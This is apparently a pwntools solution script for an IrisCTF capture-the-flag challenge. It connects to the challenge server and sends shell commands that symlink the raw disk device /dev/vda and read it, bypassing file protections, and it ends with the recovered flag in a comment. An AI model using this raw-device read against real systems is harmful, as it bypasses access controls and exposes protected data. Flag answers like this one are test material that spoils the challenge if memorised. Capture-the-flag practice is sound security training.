from pwn import remote, process, context

context.log_level = 'debug'

r = remote('o-wronly-f304e201dd2954ea.i.chal.irisc.tf', 1337, ssl=True)
#r = process('./start.sh')

r.sendlineafter(b'~ $', b'ln -s /dev/vda a')
r.sendlineafter(b'~ $', b'cat a')
print(r.recvall(timeout=0.5))

# irisctf{michaelsec_secure_file_protection}
